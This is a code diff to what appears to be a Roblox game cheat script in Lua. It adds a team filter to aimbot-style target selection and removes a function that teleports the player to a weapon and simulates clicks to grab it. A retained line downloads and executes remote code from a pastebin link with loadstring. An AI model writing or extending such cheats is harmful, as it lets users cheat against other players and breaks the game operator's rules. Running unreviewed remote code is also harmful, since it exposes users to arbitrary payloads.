@@ -60,6 +60,15 @@ local function getClosestInFOV()
 	for _, plr in ipairs(Players:GetPlayers()) do
 		if plr ~= player and plr.Character then
 			if myTeam and plr.Team == myTeam then continue end
+			
+			if myTeam then
+				local myTeamName = myTeam.Name
+				local plrTeamName = plr.Team and plr.Team.Name
+				if (myTeamName == "Guards" and plrTeamName == "Warden") or (myTeamName == "Warden" and plrTeamName == "Guards") then
+					continue
+				end
+			end
+			
 			local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
 			local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
 			if humanoid and humanoid.Health > 0 and hrp then
@@ -197,72 +206,6 @@ _G.updateFOV = function(delta)
 	end
 end
 
-_G.grabUZI = function()
-	local plr = Players.LocalPlayer
-	local char = plr.Character
-	if not char then return end
-	local hrp = char:FindFirstChild("HumanoidRootPart")
-	if not hrp then return end
-	
-	local originalPos = hrp.CFrame
-	
-	local itemPickup = nil
-	for _, model in ipairs(Workspace:GetDescendants()) do
-		if model.Name == "UZI" and model:IsA("Model") then
-			for _, descendant in ipairs(model:GetDescendants()) do
-				if descendant.Name == "ITEMPICKUP" and descendant:IsA("BasePart") then
-					itemPickup = descendant
-					break
-				end
-			end
-			if itemPickup then break end
-		end
-	end
-	
-	if not itemPickup then return end
-	
-	hrp.CFrame = CFrame.new(itemPickup.Position + Vector3.new(0, 3, 0))
-	task.wait(0.3)
-	
-	local startTime = tick()
-	while tick() - startTime < 3 do
-		local backpack = plr:FindFirstChild("Backpack")
-		if backpack and backpack:FindFirstChild("UZI") then break end
-		if char:FindFirstChild("UZI") then break end
-		
-		hrp.CFrame = CFrame.new(itemPickup.Position)
-		
-		local screenPos, onScreen = camera:WorldToViewportPoint(itemPickup.Position)
-		if onScreen then
-			pcall(function()
-				local inputObj = Instance.new("InputObject")
-				inputObj.UserInputType = Enum.UserInputType.MouseButton1
-				inputObj.UserInputState = Enum.UserInputState.Begin
-				inputObj.Position = Vector3.new(screenPos.X, screenPos.Y, 0)
-				UserInputService:TriggerInputBegan(inputObj)
-				task.wait(0.05)
-				inputObj.UserInputState = Enum.UserInputState.End
-				UserInputService:TriggerInputEnded(inputObj)
-			end)
-			
-			pcall(function()
-				local touchInput = Instance.new("InputObject")
-				touchInput.UserInputType = Enum.UserInputType.Touch
-				touchInput.UserInputState = Enum.UserInputState.Begin
-				touchInput.Position = Vector3.new(screenPos.X, screenPos.Y, 0)
-				UserInputService:TriggerInputBegan(touchInput)
-				task.wait(0.05)
-				touchInput.UserInputState = Enum.UserInputState.End
-				UserInputService:TriggerInputEnded(touchInput)
-			end)
-		end
-		
-		task.wait(0.2)
-	end
-	
-	task.wait(0.2)
-	hrp.CFrame = originalPos
-end
 
 local success, result = pcall(function()
 	loadstring(game:HttpGet('https://pastebin.com/raw/YZnL7jaV'))()
